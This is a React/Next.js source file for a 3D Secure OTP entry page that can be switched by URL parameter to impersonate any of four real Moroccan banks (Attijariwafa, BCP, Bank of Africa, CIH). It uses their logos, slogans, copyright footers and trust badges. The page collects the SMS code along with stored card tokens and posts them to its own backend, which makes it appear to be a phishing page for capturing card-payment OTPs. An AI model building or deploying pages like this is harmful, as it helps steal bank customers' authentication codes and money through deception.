import React, { useEffect, useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Check, Lock, RefreshCcw, AlertCircle, Shield, Building2, Users, TrendingUp, Globe } from "lucide-react";
import { useToast } from "@/components/ui/use-toast";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { useRouter } from "next/navigation";

// Bank configurations
const BANK_CONFIGS = {
  'attijariwafa': {
    name: 'Attijariwafa Bank',
    logo: "https://upload.wikimedia.org/wikipedia/ar/archive/b/bb/20231125144450%21Attijariwafa_bank_logo.png",
    primaryColor: '#E4002B',
    secondaryColor: '#FFB000',
    accentColor: '#1E3A8A',
    backgroundColor: 'from-red-50 to-yellow-50',
    website: 'https://www.attijariwafabank.com',
    tagline: 'Premier groupe bancaire au Maroc',
    slogan: 'Banque de tous les projets',
    icon: Building2,
    features: ['Premier réseau au Maroc', 'Services digitaux avancés', 'Financement de projets']
  },
  'bcp': {
    name: 'Banque Centrale Populaire',
    logo: "https://media.licdn.com/dms/image/v2/D4E0BAQF-1VAndPSNUw/company-logo_200_200/company-logo_200_200/0/1697464035427/bcp_bank_logo?e=2147483647&v=beta&t=TeNDPtul-7YLV0KI8rIvu5I4pJBO5KUq5grsSH3VczM",
    primaryColor: '#0066CC',
    secondaryColor: '#00A651',
    accentColor: '#FF6B35',
    backgroundColor: 'from-blue-50 to-green-50',
    website: 'https://www.groupebcp.com',
    tagline: 'Grandir. Ensemble.',
    slogan: 'Banque populaire, banque citoyenne',
    icon: Users,
    features: ['Banque coopérative', 'Proximité régionale', 'Valeurs mutualistes']
  },
  'boa': {
    name: 'Bank of Africa',
    logo: "https://lbanka.ma/images/forums-logo/bankofafrica.jpeg",
    primaryColor: '#006837',
    secondaryColor: '#FFD700',
    accentColor: '#DC143C',
    backgroundColor: 'from-green-50 to-yellow-50',
    website: 'https://www.bankofafrica.ma',
    tagline: 'Your Partner Bank',
    slogan: 'Ensemble, construisons l\'Afrique',
    icon: Globe,
    features: ['Présence panafricaine', 'Innovation bancaire', 'Partenaire de croissance']
  },
  'cih': {
    name: 'CIH Bank',
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQG0Yv64ySQ082gPBP3QskBPjW0nqto2BlTTw&s",
    primaryColor: '#003366',
    secondaryColor: '#0099CC',
    accentColor: '#FF9900',
    backgroundColor: 'from-blue-50 to-indigo-100',
    website: 'https://www.cih.ma',
    tagline: 'Crédit Immobilier et Hôtelier',
    slogan: 'Votre banque de proximité',
    icon: TrendingUp,
    features: ['Spécialiste immobilier', 'Financement hôtelier', 'Banque de développement']
  }
};

// Bank-specific logo components with actual images
const BankLogo = ({ bankKey, className = "w-full h-full" }) => {
  const config = BANK_CONFIGS[bankKey];

  switch (bankKey) {
    case 'attijariwafa':
      return (
        <div className={`${className} flex items-center justify-center bg-white rounded-lg shadow-lg border border-gray-200 p-4`}>
          <div className="flex items-center space-x-3">
            {/* Logo Image */}
            <div className="relative w-12 h-12 flex-shrink-0">
              <img
                src={config.logo}
                alt="Attijariwafa Bank Logo"
                className="w-full h-full object-contain"
                onError={(e) => {
                  // Fallback to text logo if image fails to load
                  e.target.style.display = 'none';
                  e.target.nextSibling.style.display = 'block';
                }}
              />
              {/* Fallback text logo (hidden by default) */}
              <div className="hidden w-full h-full flex items-center justify-center">
                <span
                  className="text-lg font-bold"
                  style={{ color: config.primaryColor }}
                >
                  AWB
                </span>
              </div>
            </div>

            {/* Bank Name and Tagline */}
            <div className="text-left">
              <div
                className="text-lg font-bold leading-tight"
                style={{ color: config.primaryColor }}
              >
                Attijariwafa Bank
              </div>
              <div
                className="text-xs font-medium mt-1"
                style={{ color: config.secondaryColor }}
              >
                Premier Groupe Bancaire
              </div>
            </div>
          </div>
        </div>
      );

    case 'bcp':
      return (
        <div className={`${className} flex items-center justify-center bg-white rounded-lg shadow-lg border border-gray-200 p-4`}>
          <div className="flex items-center space-x-3">
            {/* Logo Image */}
            <div className="relative w-12 h-12 flex-shrink-0">
              <img
                src={config.logo} alt="BCP Logo"
                className="w-full h-full object-contain"
                onError={(e) => {
                  e.target.style.display = 'none';
                  e.target.nextSibling.style.display = 'block';
                }}
              />
              <div className="hidden w-full h-full flex items-center justify-center">
                <span
                  className="text-lg font-bold"
                  style={{ color: config.primaryColor }}
                >
                  BCP
                </span>
              </div>
            </div>

            <div className="text-left">
              <div
                className="text-lg font-bold leading-tight"
                style={{ color: config.primaryColor }}
              >
                BCP
              </div>
              <div className="text-xs text-gray-600 font-medium">Banque Centrale Populaire</div>
              <div
                className="text-xs font-medium mt-1"
                style={{ color: config.secondaryColor }}
              >
                Grandir. Ensemble.
              </div>
            </div>
          </div>
        </div>
      );

    case 'boa':
      return (
        <div className={`${className} flex items-center justify-center bg-white rounded-lg shadow-lg border border-gray-200 p-4`}>
          <div className="flex items-center space-x-3">
            {/* Logo Image */}
            <div className="relative w-12 h-12 flex-shrink-0">
              <img
                src={config.logo} alt="Bank of Africa Logo"
                className="w-full h-full object-contain"
                onError={(e) => {
                  e.target.style.display = 'none';
                  e.target.nextSibling.style.display = 'block';
                }}
              />
              <div className="hidden w-full h-full flex items-center justify-center">
                <span
                  className="text-lg font-bold"
                  style={{ color: config.primaryColor }}
                >
                  BOA
                </span>
              </div>
            </div>

            <div className="text-left">
              <div
                className="text-lg font-bold leading-tight"
                style={{ color: config.primaryColor }}
              >
                Bank of Africa
              </div>
              <div className="text-xs text-gray-600 font-medium">BMCE Bank Group</div>
              <div
                className="text-xs font-medium mt-1"
                style={{ color: config.secondaryColor }}
              >
                Your Partner Bank
              </div>
            </div>
          </div>
        </div>
      );

    case 'cih':
      return (
        <div className={`${className} flex items-center justify-center bg-white rounded-lg shadow-lg border border-gray-200 p-4`}>
          <div className="flex items-center space-x-3">
            {/* Logo Image */}
            <div className="relative w-12 h-12 flex-shrink-0">
              <img
                src={config.logo} alt="CIH Bank Logo"
                className="w-full h-full object-contain"
                onError={(e) => {
                  e.target.style.display = 'none';
                  e.target.nextSibling.style.display = 'block';
                }}
              />
              <div className="hidden w-full h-full flex items-center justify-center">
                <span
                  className="text-lg font-bold"
                  style={{ color: config.primaryColor }}
                >
                  CIH
                </span>
              </div>
            </div>

            <div className="text-left">
              <div
                className="text-lg font-bold leading-tight"
                style={{ color: config.primaryColor }}
              >
                CIH BANK
              </div>
              <div className="text-xs text-gray-600 font-medium">Crédit Immobilier et Hôtelier</div>
              <div
                className="text-xs font-medium mt-1"
                style={{ color: config.secondaryColor }}
              >
                Votre banque de proximité
              </div>
            </div>
          </div>
        </div>
      );

    default:
      return null;
  }
};

interface ErrorDisplayProps {
  message?: string;
  retry?: () => void;
  bankKey: string;
}

const ErrorDisplay: React.FC<ErrorDisplayProps> = ({ message, retry, bankKey }) => {
  const config = BANK_CONFIGS[bankKey];

  return (
    <div className={`min-h-screen bg-gradient-to-br ${config.backgroundColor} py-8 px-4 flex flex-col items-center justify-center`}>
      <div className="bg-white p-8 shadow-xl rounded-lg text-center max-w-md w-full border border-gray-200">
        <div className="flex justify-center mb-4">
          <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
            <AlertCircle className="h-10 w-10 text-red-500" />
          </div>
        </div>
        <h2 className="text-xl font-bold text-gray-800 mb-2">Une erreur est survenue</h2>
        <p className="text-gray-600 mb-6">{message || "Impossible de charger les informations de paiement. Veuillez réessayer plus tard."}</p>
        {retry && (
          <button
            onClick={retry}
            className="py-2 px-6 rounded-md font-medium transition-colors duration-200 text-white"
            style={{ backgroundColor: config.primaryColor }}
          >
            Réessayer
          </button>
        )}
      </div>
      <footer className="mt-10 text-center text-xs text-gray-500">
        Copyright © {new Date().getFullYear()} {config.name} - Tous droits réservés.{" "}
        <a href={config.website} className="hover:underline" style={{ color: config.primaryColor }}>
          {config.website.replace('https://', '')}
        </a>
      </footer>
    </div>
  );
};

const Spinner: React.FC = () => (
  <div className="h-4 w-4 mr-2 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
);

const SuccessDisplay: React.FC<{ returnToClient: () => void; bankKey: string }> = ({ returnToClient, bankKey }) => {
  const [countdown, setCountdown] = useState(5);
  const config = BANK_CONFIGS[bankKey];

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          returnToClient();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [returnToClient]);

  return (
    <div className={`min-h-screen bg-gradient-to-br ${config.backgroundColor} py-8 px-4 flex flex-col items-center justify-center`}>
      <div className="bg-white p-8 shadow-xl rounded-lg text-center max-w-md w-full border border-gray-200">
        <div className="flex justify-center mb-4">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
            <Check className="h-10 w-10 text-green-500" />
          </div>
        </div>
        <h2 className="text-xl font-bold text-gray-800 mb-2">Paiement réussi</h2>
        <p className="text-gray-600 mb-6">Votre transaction a été traitée avec succès.</p>
        <p className="text-sm text-gray-500">
          Redirection automatique dans {countdown} secondes...
        </p>
        <Button
          onClick={returnToClient}
          className="mt-4 text-white font-medium transition-colors duration-200"
          style={{ backgroundColor: config.primaryColor }}
        >
          Retourner maintenant
        </Button>
      </div>
      <footer className="mt-10 text-center text-xs text-gray-500">
        Copyright © {new Date().getFullYear()} {config.name} - Tous droits réservés.{" "}
        <a href={config.website} className="hover:underline" style={{ color: config.primaryColor }}>
          {config.website.replace('https://', '')}
        </a>
      </footer>
    </div>
  );
};

interface PaymentResponse {
  validationToken: string;
  success: boolean;
  message?: string;
  url: string;
}

const OtpVerification: React.FC = () => {
  const [otp, setOtp] = useState<string>("");
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [remainingTime, setRemainingTime] = useState<number>(180);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<boolean>(false);
  const [bankKey, setBankKey] = useState<string>('attijariwafa'); // Default bank
  const { toast } = useToast();
  const router = useRouter();

  const [token, setToken] = useState<string | null>(null);
  const [cardToken, setCardToken] = useState<string | null>(null);
  const [returnUrl, setReturnUrl] = useState<string | null>(null);

  const config = BANK_CONFIGS[bankKey];
  const IconComponent = config.icon;

  useEffect(() => {
    // Access localStorage and URL params only on client-side
    const urlParams = new URLSearchParams(window.location.search);
    const bank = urlParams.get('bank') || 'attijariwafa';
    setBankKey(bank);

    setToken(localStorage.getItem("token"));
    setCardToken(localStorage.getItem("cardToken"));
    setReturnUrl(localStorage.getItem("returnUrl") || "/");
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setRemainingTime((prev) => {
        if (prev <= 0) return 0;
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleVerifyOtp = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();

    if (otp.length !== 6) {
      toast({
        title: "Erreur de validation",
        description: "Veuillez saisir un code OTP à 6 chiffres",
        variant: "destructive",
      });
      return;
    }

    if (!token || !cardToken) {
      setError("Informations de paiement manquantes. Veuillez réessayer.");
      return;
    }

    setIsSubmitting(true);
    setError(null);

    try {
      const paymentPayload = {
        token,
        cardToken,
        otp,
        bank: bankKey,
      };

      const response = await fetch('/api/payment-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentPayload),
      });

      const data = await response.json();

      if (response.ok && data) {
        if (data.validationToken) {
          localStorage.setItem('validationToken', data.validationToken);
        }

        setReturnUrl(data.url);

        toast({
          title: "Paiement réussi",
          description: "Votre transaction a été traitée avec succès.",
          variant: "default",
        });

        setSuccess(true);
        window.location.href = data.url;
      } else {
        throw new Error(data.message || "Erreur lors du traitement du paiement");
      }
    } catch (error: any) {
      const errorMessage = error.message || "Erreur lors du traitement du paiement";

      toast({
        title: "Échec de la transaction",
        description: errorMessage,
        variant: "destructive",
      });

      setError(errorMessage);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResendOtp = async (): Promise<void> => {
    if (!token || !cardToken) {
      setError("Informations de paiement manquantes. Veuillez réessayer.");
      return;
    }

    try {
      const response = await fetch('/api/resend-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ token, cardToken, bank: bankKey }),
      });

      if (response.ok) {
        setRemainingTime(180);
        toast({
          title: "Code OTP renvoyé",
          description: "Un nouveau code OTP a été envoyé à votre téléphone.",
        });
      } else {
        const errorData = await response.json();
        throw new Error(errorData.error || "Erreur lors de l'envoi du code OTP");
      }
    } catch (error: any) {
      const errorMessage = error.message || "Erreur lors de l'envoi du code OTP";

      toast({
        title: "Échec de l'envoi",
        description: errorMessage,
        variant: "destructive",
      });
    }
  };

  const returnToClient = (): void => {
    localStorage.removeItem("token");
    localStorage.removeItem("cardToken");

    if (returnUrl) {
      window.location.href = returnUrl;
    } else {
      router.push("/");
    }
  };

  const switchBank = (newBankKey: string) => {
    setBankKey(newBankKey);
    const url = new URL(window.location.href);
    url.searchParams.set('bank', newBankKey);
    window.history.replaceState({}, '', url.toString());
  };

  if (success) {
    return <SuccessDisplay returnToClient={returnToClient} bankKey={bankKey} />;
  }

  if (token === null && typeof window !== 'undefined') {
    return (
      <ErrorDisplay
        message="Aucun token trouvé. Veuillez vous reconnecter."
        retry={() => router.back()}
        bankKey={bankKey}
      />
    );
  }

  return (
    <div className={`min-h-screen bg-gradient-to-br ${config.backgroundColor} py-8 px-4 sm:px-6 lg:px-8 flex flex-col items-center`}>
      <div className="w-full max-w-md mx-auto">
        {/* Bank Selection */}
        <div className="mb-6">
          <div className="flex justify-center space-x-2 mb-4">
            {Object.entries(BANK_CONFIGS).map(([key, bankConfig]) => (
              <button
                key={key}
                onClick={() => switchBank(key)}
                className={`px-3 py-1 text-xs rounded-full font-medium transition-all duration-200 ${bankKey === key
                  ? 'text-white shadow-md'
                  : 'bg-white text-gray-600 hover:bg-gray-50'
                  }`}
                style={bankKey === key ? { backgroundColor: bankConfig.primaryColor } : {}}
              >
                {bankConfig.name.split(' ')[0]}
              </button>
            ))}
          </div>
        </div>

        {/* Bank Header */}
        <div className="flex flex-col items-center mb-8">
          <BankLogo bankKey={bankKey} className="w-64 h-20 mb-6" />

          <h1 className="text-2xl sm:text-3xl font-bold text-center mb-2" style={{ color: config.primaryColor }}>
            Authentification Sécurisée
          </h1>
          <p className="text-sm text-gray-600 text-center mb-4">{config.tagline}</p>

          <div className="flex items-center text-gray-600 text-sm">
            <Shield className="h-4 w-4 mr-2" style={{ color: config.primaryColor }} />
            <span>Protection 3D Secure</span>
          </div>
        </div>

        <Card className="bg-white p-8 shadow-xl rounded-lg mb-6 border border-gray-200">
          {error && (
            <div className="mb-6 p-4 rounded-lg bg-red-50 border border-red-200 text-red-700 text-sm flex items-start">
              <AlertCircle className="h-5 w-5 mr-3 shrink-0 mt-0.5 text-red-500" />
              <p>{error}</p>
            </div>
          )}

          <div className="space-y-6">
            <div className="text-center">
              <div
                className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
                style={{ backgroundColor: `${config.primaryColor}20` }}
              >
                <Lock className="h-8 w-8" style={{ color: config.primaryColor }} />
              </div>

              <h2 className="text-xl font-semibold text-gray-900 mb-2">Code de Vérification</h2>
              <p className="text-gray-600 mb-8 leading-relaxed">
                Pour sécuriser votre transaction avec {config.name}, veuillez saisir le code à 6 chiffres
                envoyé par SMS à votre numéro de téléphone
              </p>

              <div className="flex justify-center mb-8">
                <InputOTP maxLength={6} value={otp} onChange={setOtp}>
                  <InputOTPGroup>
                    {[0, 1, 2, 3, 4, 5].map((index) => (
                      <InputOTPSlot
                        key={index}
                        index={index}
                        className="w-12 h-12 text-lg border-2 border-gray-300 rounded-lg"
                        style={{
                          focusBorderColor: config.primaryColor,
                          '--focus-border-color': config.primaryColor
                        }}
                      />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
              </div>

              <div className="flex items-center justify-center space-x-4 mb-6">
                <div className="text-sm text-gray-600">
                  <span className="font-medium">Expire dans:</span>{" "}
                  <span className="font-bold" style={{ color: config.primaryColor }}>
                    {formatTime(remainingTime)}
                  </span>
                </div>
              </div>

              <div className="flex justify-center mb-6">
                <Button
                  type="button"
                  variant="ghost"
                  className="font-medium hover:bg-opacity-10"
                  onClick={handleResendOtp}
                  disabled={remainingTime > 0 || isSubmitting}
                  style={{
                    color: config.primaryColor,
                    backgroundColor: `${config.primaryColor}10`
                  }}
                >
                  <RefreshCcw className="mr-2 h-4 w-4" />
                  {remainingTime > 0 ? "Renvoyer le code" : "Renvoyer le code OTP"}
                </Button>
              </div>
            </div>

            <div
              className="flex items-start gap-3 text-sm p-4 rounded-lg border"
              style={{
                backgroundColor: `${config.primaryColor}08`,
                borderColor: `${config.primaryColor}30`,
                color: config.primaryColor
              }}
            >
              <IconComponent size={18} className="shrink-0 mt-0.5" />
              <div>
                <p className="font-medium mb-1">Sécurité {config.name}</p>
                <p style={{ color: `${config.primaryColor}CC` }}>
                  Cette vérification protège votre transaction contre toute utilisation frauduleuse
                </p>
              </div>
            </div>

            <Button
              onClick={handleVerifyOtp}
              className="w-full text-white font-medium py-3 text-base rounded-lg transition-colors duration-200"
              disabled={otp.length !== 6 || isSubmitting}
              style={{ backgroundColor: config.primaryColor }}
            >
              {isSubmitting ? (
                <>
                  <Spinner />
                  Vérification en cours...
                </>
              ) : (
                <>
                  <Lock size={18} className="mr-2" />
                  Valider la Transaction
                </>
              )}
            </Button>
          </div>
        </Card>

        {/* Bank Features */}
        <div className="mb-6 bg-white/50 backdrop-blur-sm rounded-lg p-4 border border-white/20">
          <div className="flex items-center justify-center space-x-6 text-xs text-gray-600">
            {config.features.map((feature, index) => (
              <div key={index} className="flex items-center">
                <div
                  className="w-2 h-2 rounded-full mr-2"
                  style={{ backgroundColor: config.secondaryColor }}
                ></div>
                <span>{feature}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Trust indicators */}
        <div className="text-center mb-6">
          <div className="flex items-center justify-center space-x-6 text-xs text-gray-500">
            <div className="flex items-center">
              <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
              <span>Connexion Sécurisée</span>
            </div>
            <div className="flex items-center">
              <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
              <span>SSL 256-bit</span>
            </div>
          </div>
        </div>

        <footer className="mt-10 text-center text-xs text-gray-500 space-y-2">
          <p>
            Copyright © {new Date().getFullYear()} {config.name} - Tous droits réservés.{" "}
            <a href={config.website} className="hover:underline" style={{ color: config.primaryColor }}>
              {config.website.replace('https://', '')}
            </a>
          </p>
          <p className="text-gray-400">{config.slogan}</p>
        </footer>
      </div>
    </div>
  );
};

export default OtpVerification;